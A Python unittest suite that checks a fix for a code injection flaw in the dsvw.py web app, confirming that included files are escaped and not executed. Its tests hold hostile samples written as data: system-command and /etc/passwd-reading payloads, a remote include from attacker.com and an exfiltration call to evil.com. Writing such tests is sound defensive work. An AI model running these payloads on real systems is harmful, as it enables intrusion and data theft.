#!/usr/bin/env python
"""
Comprehensive tests for the Code Injection vulnerability remediation in dsvw.py

This test suite validates that:
1. The exec() vulnerability has been fixed and no arbitrary code can be executed
2. The application safely displays fetched content without executing it
3. Output is properly escaped to prevent XSS
4. Various attack vectors are blocked
5. Legitimate functionality still works
"""

import unittest
import http.server
import threading
import time
import urllib.request
import urllib.parse
import socket
import tempfile
import os
from unittest.mock import patch, MagicMock


class TestCodeInjectionRemediation(unittest.TestCase):
    """Test suite for code injection vulnerability remediation"""

    @classmethod
    def setUpClass(cls):
        """Set up test server"""
        # Import dsvw module
        import dsvw

        # Initialize the database
        dsvw.init()

        # Find an available port
        cls.test_port = cls._find_free_port()
        cls.base_url = f"http://127.0.0.1:{cls.test_port}"

        # Start test server in a separate thread
        cls.server = dsvw.ThreadingServer(("127.0.0.1", cls.test_port), dsvw.ReqHandler)
        cls.server_thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.server_thread.start()

        # Wait for server to start
        time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        """Shut down test server"""
        if hasattr(cls, 'server'):
            cls.server.shutdown()
            cls.server.server_close()

    @staticmethod
    def _find_free_port():
        """Find a free port for testing"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            s.listen(1)
            port = s.getsockname()[1]
        return port

    def test_exec_not_executed_with_malicious_code(self):
        """
        CRITICAL TEST: Verify that malicious Python code is NOT executed

        This test attempts to execute code that would create a file if exec() was still active.
        The fix should prevent code execution entirely.
        """
        # Create a temporary file path that shouldn't be created
        test_marker = f"/tmp/test_marker_{os.getpid()}_{int(time.time())}.txt"

        # Ensure the file doesn't exist before test
        if os.path.exists(test_marker):
            os.remove(test_marker)

        # Create a temporary Python file with malicious code
        malicious_code = f"""
import os
# This should NOT execute if vulnerability is fixed
with open('{test_marker}', 'w') as f:
    f.write('VULNERABILITY_EXPLOITED')
print('Code executed!')
"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
            tmp.write(malicious_code)
            tmp_path = tmp.name

        try:
            # Attempt to include and execute the malicious file
            url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"

            try:
                response = urllib.request.urlopen(url, timeout=5)
                content = response.read().decode()

                # Wait a moment to ensure code would have executed if vulnerable
                time.sleep(0.5)

                # ASSERTION 1: The marker file should NOT exist (code not executed)
                self.assertFalse(
                    os.path.exists(test_marker),
                    "CRITICAL: Code was executed! The vulnerability is NOT fixed!"
                )

                # ASSERTION 2: Content should be HTML-escaped (safe display)
                self.assertIn("&lt;", content.lower() + content,
                             "Content should be HTML-escaped for safe display")

                # ASSERTION 3: The response should not contain executed output
                self.assertNotIn("Code executed!", content,
                                "Code should not have been executed")

            except urllib.error.HTTPError as e:
                # If there's an HTTP error, that's acceptable as long as code wasn't executed
                self.assertFalse(
                    os.path.exists(test_marker),
                    "CRITICAL: Code was executed despite HTTP error!"
                )

        finally:
            # Cleanup
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(test_marker):
                os.remove(test_marker)

    def test_remote_code_execution_blocked(self):
        """
        Test that remote code execution via URLs is blocked

        This simulates an attacker providing a URL to malicious Python code.
        """
        # Create a mock for urlopen to simulate remote content
        malicious_remote_code = b"""
import subprocess
# Attempt to execute system command
subprocess.call(['echo', 'EXPLOITED'])
"""

        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = malicious_remote_code
            mock_urlopen.return_value = mock_response

            # Attempt remote file inclusion
            url = f"{self.base_url}/?include=http://attacker.com/evil.py"

            try:
                response = urllib.request.urlopen(url, timeout=5)
                content = response.read().decode()

                # ASSERTION: Code should not be executed, but displayed safely
                self.assertIn("&lt;", content.lower() + content,
                             "Remote code should be HTML-escaped, not executed")
                self.assertNotIn("EXPLOITED", content,
                                "Remote code should not have been executed")
            except Exception:
                # If there's an error, that's acceptable for security
                pass

    def test_output_is_properly_escaped(self):
        """
        Test that fetched content is properly HTML-escaped to prevent XSS

        This ensures the fix doesn't introduce a new XSS vulnerability.
        """
        # Create content with HTML/JS that should be escaped
        xss_content = "<script>alert('XSS')</script><img src=x onerror=alert(1)>"

        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp:
            tmp.write(xss_content)
            tmp_path = tmp.name

        try:
            url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"
            response = urllib.request.urlopen(url, timeout=5)
            content = response.read().decode()

            # ASSERTION 1: HTML tags should be escaped
            self.assertIn("&lt;script&gt;", content,
                         "HTML tags should be properly escaped")
            self.assertIn("&lt;img", content,
                         "HTML img tags should be properly escaped")

            # ASSERTION 2: Raw script tags should NOT be present
            self.assertNotIn("<script>alert('XSS')</script>", content,
                            "Raw script tags should not be in output")

            # ASSERTION 3: Content should be in a <pre> tag for display
            self.assertIn("<pre>", content,
                         "Content should be wrapped in <pre> tags")

        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_various_attack_payloads_blocked(self):
        """
        Test multiple attack payloads to ensure comprehensive protection
        """
        attack_payloads = [
            # Python code execution attempts
            "import os; os.system('whoami')",
            "__import__('os').system('id')",
            "exec('print(1)')",
            "eval('1+1')",

            # File system attacks
            "open('/etc/passwd').read()",

            # Network attacks
            "import urllib.request; urllib.request.urlopen('http://evil.com/exfil')",
        ]

        for payload in attack_payloads:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
                tmp.write(payload)
                tmp_path = tmp.name

            try:
                url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"

                try:
                    response = urllib.request.urlopen(url, timeout=5)
                    content = response.read().decode()

                    # ASSERTION: Content should be escaped, not executed
                    # The payload should appear as text, not be executed
                    self.assertTrue(
                        any(char in content for char in ['&lt;', '&gt;', '&amp;', '<pre>']),
                        f"Attack payload should be safely displayed: {payload[:50]}"
                    )
                except Exception:
                    # Errors are acceptable as long as code isn't executed
                    pass

            finally:
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)

    def test_legitimate_text_file_inclusion_works(self):
        """
        Test that legitimate use case (including text files) still works

        This ensures the fix doesn't break normal functionality.
        """
        # Create a legitimate text file
        legitimate_content = "This is legitimate content\nLine 2\nLine 3"

        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp:
            tmp.write(legitimate_content)
            tmp_path = tmp.name

        try:
            url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"
            response = urllib.request.urlopen(url, timeout=5)
            content = response.read().decode()

            # ASSERTION 1: Content should be present
            self.assertIn("This is legitimate content", content,
                         "Legitimate content should be displayed")

            # ASSERTION 2: Content should be in <pre> tags
            self.assertIn("<pre>", content,
                         "Content should be wrapped in <pre> tags")

            # ASSERTION 3: Basic HTML structure should be intact
            self.assertTrue(response.status == 200,
                           "Response should be successful")

        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_special_characters_handled_correctly(self):
        """
        Test that special characters and encoding issues are handled properly
        """
        # Content with various special characters
        special_content = "Test: <>&\"'\n\t\r\x00\xff"

        with tempfile.NamedTemporaryFile(mode='wb', suffix='.txt', delete=False) as tmp:
            tmp.write(special_content.encode('latin-1'))
            tmp_path = tmp.name

        try:
            url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"
            response = urllib.request.urlopen(url, timeout=5)
            content = response.read().decode()

            # ASSERTION 1: HTML entities should be escaped
            self.assertIn("&lt;", content,
                         "< should be escaped as &lt;")
            self.assertIn("&gt;", content,
                         "> should be escaped as &gt;")
            self.assertIn("&amp;", content,
                         "& should be escaped as &amp;")

            # ASSERTION 2: No errors should occur with special chars
            self.assertIsNotNone(content,
                                "Content should be returned without errors")

        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_no_environment_variable_leakage(self):
        """
        Test that environment variables used in the old vulnerable code are no longer exposed

        The old code created an 'envs' dictionary with sensitive info like REMOTE_ADDR.
        This should not be leaked or accessible through code execution.
        """
        # Try to access environment variables that were in the old 'envs' dict
        access_env_code = """
import os
print("DOCUMENT_ROOT:", os.environ.get('DOCUMENT_ROOT', 'NOT_FOUND'))
print("REMOTE_ADDR:", REMOTE_ADDR if 'REMOTE_ADDR' in dir() else 'NOT_FOUND')
"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
            tmp.write(access_env_code)
            tmp_path = tmp.name

        try:
            url = f"{self.base_url}/?include={urllib.parse.quote(tmp_path)}"
            response = urllib.request.urlopen(url, timeout=5)
            content = response.read().decode()

            # ASSERTION: Environment variables should not be printed (code not executed)
            self.assertNotIn("DOCUMENT_ROOT:", content,
                            "Environment variables should not be executed/printed")
            self.assertNotIn("REMOTE_ADDR:", content,
                            "Remote address should not be leaked through execution")

        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)


class TestCodeInjectionWithoutServer(unittest.TestCase):
    """
    Unit tests that don't require a running server

    These tests verify the remediation at a code level.
    """

    def test_exec_function_removed_from_code(self):
        """
        Verify that exec() is no longer used in the include parameter handling
        """
        with open('./dsvw.py', 'r') as f:
            content = f.read()

        # Find the include parameter handling section
        include_section_start = content.find('elif "include" in params:')
        self.assertNotEqual(include_section_start, -1, "Include section should exist")

        # Get the next 500 characters after the include section
        include_section = content[include_section_start:include_section_start + 500]

        # ASSERTION 1: exec() should not be in the include section
        self.assertNotIn("exec(", include_section,
                        "exec() function should be removed from include handling")

        # ASSERTION 2: html.escape should be present (for safe output)
        self.assertIn("html.escape", include_section,
                     "html.escape should be used for safe output")

        # ASSERTION 3: Security comment should be present
        self.assertIn("SECURITY", include_section.upper(),
                     "Security fix should be documented with a comment")

    def test_html_escape_import_available(self):
        """
        Verify that html.escape is imported and available
        """
        import dsvw

        # ASSERTION: html module should be imported
        self.assertTrue(hasattr(dsvw, 'html'),
                       "html module should be imported")
        self.assertTrue(hasattr(dsvw.html, 'escape'),
                       "html.escape should be available")


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
